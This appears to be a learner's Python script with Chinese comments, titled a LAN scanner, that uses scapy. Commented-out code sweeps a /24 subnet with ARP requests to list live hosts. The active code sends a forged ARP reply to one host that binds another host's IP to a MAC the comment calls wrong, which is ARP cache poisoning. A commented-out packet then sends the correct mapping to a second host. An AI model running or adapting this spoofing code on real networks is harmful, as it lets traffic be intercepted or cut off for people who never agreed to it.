# 局域网扫描器，scapy
# 导入scapy的所有功能
from scapy.all import *

# 首先要选择网卡的接口，就需要查看网卡接口有什么,在进行选择
# print(show_interfaces())
# wifi = 'Intel(R) Wireless-AC 9560 160MHz'
#
# # 模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
# p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='192.168.43.0/24')
# # ans表示收到的包的回复
# ans, unans = srp(p, iface=wifi, timeout=5)
#
# print("一共扫描到%d台主机：" % len(ans))
#
# # 将需要的IP地址和Mac地址存放在result列表中
# result = []
# for s, r in ans:
#     # 解析收到的包，提取出需要的IP地址和MAC地址
#     result.append([r[ARP].psrc, r[ARP].hwsrc])
# # 将获取的信息进行排序，看起来更整齐一点
# result.sort()
#
# for ip, mac in result:
#     print(ip, '------>', mac)



p =  ARP(
    op=2,
    hwsrc="24:ee:9a:e3:2d:49",#错误的mac
    hwdst="c0:b5:d7:65:36:ff",
    psrc="192.168.43.184",
    pdst="192.168.43.73"
    )
sr1(p)
#
# # time.sleep(10)
# p =  ARP(
#     op=2,
#     hwsrc="24:ee:9a:e3:2d:49",#正确的mac
#     hwdst="d0:c5:d3:f3:fc:23",
#     psrc="192.168.43.184",
#     pdst="192.168.43.226"
#     )
# # sr1(p)
